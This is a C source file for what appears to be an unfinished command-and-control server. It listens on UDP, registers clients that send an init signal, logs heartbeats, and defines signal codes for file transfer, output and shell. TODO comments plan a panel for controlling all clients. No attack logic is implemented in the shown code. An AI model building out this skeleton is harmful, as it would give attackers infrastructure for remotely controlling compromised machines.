#include "netlib.h"
#include "db.h"
#include <pthread.h>
#include "bs_config.h"
#include "utils.h"
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

enum SIG  {_SIG_INIT = 0x00, _SIG_HRBT= 0xff, _SIG_FILE = 0x01, _SIG_COUT = 0x02, _SIG_SHLL = 0x03};

// struct udp_arg{
//     int sockfd;
//     struct db* db;
// };

// void udp_handler(isockfd){

// }

int main(int argc, char **argv)
{
	printf("Starting\n");
    int sockfd_u, csockfd,resplen = 0;
    struct sockaddr_in addr;
    ssize_t bytesRead;
    int port, backlog;
    char buf[BUFFER_SIZE];
    pthread_t tid;
    char ip4[INET_ADDRSTRLEN];
    struct sockaddr_in caddr;
#ifndef CUSTOM_PORT
    port = PORT;
#endif

#ifndef CUSTOM_SADDR
    char s_addr[] = "0.0.0.0";
#endif

#ifndef CUSTOM_BACKLOG
    backlog = DEFAULT_BACKLOG;
#endif
    int recv_socket, response_socket;
    struct sockaddr_in local_addr, client_addr;
    socklen_t client_addr_len = 16;
    unsigned char buffer[8];
    struct db* db = NULL;
    memset(&client_addr, 0, sizeof(client_addr));
    create_udp_socket(&sockfd_u);
    update_sockaddr_in(&local_addr, AF_INET, PORT, NULL);
    bind_socket(sockfd_u, &local_addr);
    create_db(&db);
    if (db == NULL){
        exit(EXIT_FAILURE);
    }
    char siginit = 0;
    // TODO: Start a thread which listens for UDP
    // and adds new clients to some kind of DB
    //     if(pthread_create(&tid, NULL, udp_handler, NULL) != 0)
    // {
    //     perror("Thread creation failed.");
    //     exit(EXIT_FAILURE);
    // }
    // pthread_detach(tid);
    int bytes = 0;
    DBGLG("Listening for UDP packets...\n");
    while (1) {
        if ((bytes = recvfrom(sockfd_u, buffer, 8, 0, (struct sockaddr*)&client_addr, &client_addr_len))< 0){
            DBGLG("Failed at recieving data\n");
        }
        printf("we got %d bytes first byte we got is %d\n",bytes,  buffer[0]);
        printf("inet addr we got connection from is %s\n", get_ip(client_addr));
        if (buffer[0] == _SIG_INIT){
            if (add_db(db, (char*)&client_addr, time(NULL)) == 0){
                if((sendto(sockfd_u, &siginit, 1, 0, (struct sockaddr*)&client_addr, 16))< 0){
                    DBGLG("Failed at sending data\n");
                }
            }
        }
        if (buffer[0] == _SIG_HRBT){
            DBGLG("Got a heartbeat\n");
        }
        save_db(db, "./db.db");
        // TODO: Write a menu
        // basically a control panel
        // It can choose to which client to interact
        // Or Interact with all




    }
	printf("Exiting?\n");
    return EXIT_SUCCESS;
}
